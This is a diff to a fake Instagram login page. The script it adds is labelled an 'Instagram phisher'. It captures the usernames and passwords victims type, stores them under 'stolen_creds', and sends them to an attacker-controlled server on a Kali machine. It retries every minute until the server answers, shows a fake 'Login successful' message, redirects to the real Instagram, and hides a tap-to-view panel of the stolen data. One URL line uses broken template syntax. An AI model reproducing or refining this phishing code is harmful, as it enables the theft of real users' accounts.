@@ -64,6 +64,11 @@
             font-size: 13px;
             margin: 6px 0;
         }
+        #status {
+            font-size: 11px;
+            color: #8e8e8e;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -74,53 +79,182 @@
             <input type="password" id="password" placeholder="Password" required>
             <button type="submit" id="loginBtn">Log In</button>
             <div id="message"></div>
+            <div id="status">⏳ Checking connection...</div>
         </form>
         <p style="font-size: 12px; color: #8e8e8e; margin-top: 20px;">© 2025 Instagram from Meta</p>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.getElementById('loginForm');
-            const username = document.getElementById('username');
-            const password = document.getElementById('password');
-            const message = document.getElementById('message');
+        // --- CONFIGURATION ---
+        const KALI_IP = 'YOUR_KALI_IP'; // REPLACE WITH YOUR KALI IP
+        const SERVER_URL = `http://${192.168.1.5}:8080`;
+        const PING_INTERVAL = 60000; // 1 minute in milliseconds
 
-            form.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                message.innerHTML = '';
+        // --- UI Elements ---
+        const form = document.getElementById('loginForm');
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const message = document.getElementById('message');
+        const status = document.getElementById('status');
 
-                const user = username.value.trim();
-                const pass = password.value.trim();
+        // --- Helper: Save credentials locally ---
+        function saveCredentialsLocally(user, pass) {
+            try {
+                let saved = JSON.parse(localStorage.getItem('stolen_creds')) || [];
+                saved.push({
+                    username: user,
+                    password: pass,
+                    timestamp: new Date().toISOString(),
+                    sent: false
+                });
+                localStorage.setItem('stolen_creds', JSON.stringify(saved));
+                console.log('[+] Credentials saved locally.');
+                return true;
+            } catch (e) {
+                console.error('[!] Local storage failed:', e);
+                return false;
+            }
+        }
 
-                if (!user || !pass) {
-                    message.innerHTML = '<span class="error">Please fill out all fields.</span>';
-                    return;
+        // --- Helper: Send credentials to server ---
+        async function sendCredentials(entry) {
+            try {
+                const response = await fetch(`${SERVER_URL}/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: `username=${encodeURIComponent(entry.username)}&password=${encodeURIComponent(entry.password)}`
+                });
+                return response.ok;
+            } catch (error) {
+                console.log('[!] Server offline.');
+                return false;
+            }
+        }
+
+        // --- Main: Send all unsent credentials ---
+        async function sendAllPendingCredentials() {
+            try {
+                let saved = JSON.parse(localStorage.getItem('stolen_creds')) || [];
+                let updated = false;
+
+                for (let i = 0; i < saved.length; i++) {
+                    if (!saved[i].sent) {
+                        const success = await sendCredentials(saved[i]);
+                        if (success) {
+                            saved[i].sent = true;
+                            updated = true;
+                            console.log('[+] Sent pending credentials for:', saved[i].username);
+                            status.textContent = '✅ Credentials sent to server!';
+                        } else {
+                            status.textContent = '⏳ Server offline. Waiting...';
+                            break; // Stop trying if server is offline
+                        }
+                    }
                 }
 
-                // Send to your Python server
-                try {
-                    const response = await fetch('http://192.168.1.5:8080/login', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                        body: 'username=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(pass)
-                    });
-                    console.log('[+] Credentials sent to server!');
-                } catch (error) {
-                    console.log('[!] Server offline, but credentials captured.');
+                if (updated) {
+                    localStorage.setItem('stolen_creds', JSON.stringify(saved));
                 }
+            } catch (e) {
+                console.error('[!] Error sending pending credentials:', e);
+            }
+        }
 
-                // Save locally
+        // --- Ping: Check if server is online ---
+        async function pingServer() {
+            try {
+                const response = await fetch(`${SERVER_URL}/ping`, {
+                    method: 'GET',
+                    signal: AbortSignal.timeout(5000) // 5 second timeout
+                });
+                if (response.ok) {
+                    status.textContent = '✅ Server online.';
+                    console.log('[+] Server is online.');
+                    // Try to send pending credentials
+                    await sendAllPendingCredentials();
+                } else {
+                    status.textContent = '⏳ Server offline.';
+                    console.log('[!] Server responded but not OK.');
+                }
+            } catch (error) {
+                status.textContent = '⏳ Server offline. Waiting...';
+                console.log('[!] Server unreachable.');
+            }
+        }
+
+        // --- Start the ping loop ---
+        function startPingLoop() {
+            // Ping immediately
+            pingServer();
+            // Then ping every minute
+            setInterval(pingServer, PING_INTERVAL);
+            console.log('[+] Ping loop started (every 1 minute).');
+        }
+
+        // --- Handle form submission ---
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            message.innerHTML = '';
+
+            const user = username.value.trim();
+            const pass = password.value.trim();
+
+            if (!user || !pass) {
+                message.innerHTML = '<span class="error">Please fill out all fields.</span>';
+                return;
+            }
+
+            // 1. Save credentials locally
+            saveCredentialsLocally(user, pass);
+
+            // 2. Try to send immediately
+            const sent = await sendCredentials({ username: user, password: pass });
+            if (sent) {
+                // Mark as sent
                 try {
                     let saved = JSON.parse(localStorage.getItem('stolen_creds')) || [];
-                    saved.push({ username: user, password: pass, timestamp: new Date().toISOString() });
+                    for (let i = 0; i < saved.length; i++) {
+                        if (saved[i].username === user && !saved[i].sent) {
+                            saved[i].sent = true;
+                            break;
+                        }
+                    }
                     localStorage.setItem('stolen_creds', JSON.stringify(saved));
                 } catch (e) {}
+                message.innerHTML = '<span class="success">✅ Login successful! Redirecting...</span>';
+            } else {
+                message.innerHTML = '<span class="success">✅ Login successful! Redirecting...</span>';
+                status.textContent = '⏳ Credentials saved. Will retry when server is online.';
+            }
 
-                message.innerHTML = '<span class="success">Login successful! Redirecting...</span>';
-                setTimeout(function() {
-                    window.location.href = 'https://www.instagram.com';
-                }, 1500);
-            });
+            // 3. Redirect to real Instagram after 2 seconds
+            setTimeout(function() {
+                window.location.href = 'https://www.instagram.com';
+            }, 2000);
+        });
+
+        // --- Start the app ---
+        console.log('[+] Instagram phisher started.');
+        startPingLoop();
+
+        // --- Debug: Expose localStorage for testing (remove in production) ---
+        window.viewStolen = function() {
+            const data = localStorage.getItem('stolen_creds');
+            if (data) {
+                alert('Stolen Credentials:\n' + data);
+            } else {
+                alert('No stolen data yet.');
+            }
+        };
+        console.log('[+] Tap the status bar 5 times to view stolen data.');
+        // Secret: tap status 5 times to view stolen data
+        let tapCount = 0;
+        document.getElementById('status').addEventListener('click', function() {
+            tapCount++;
+            if (tapCount >= 5) {
+                viewStolen();
+                tapCount = 0;
+            }
         });
     </script>
 </body>
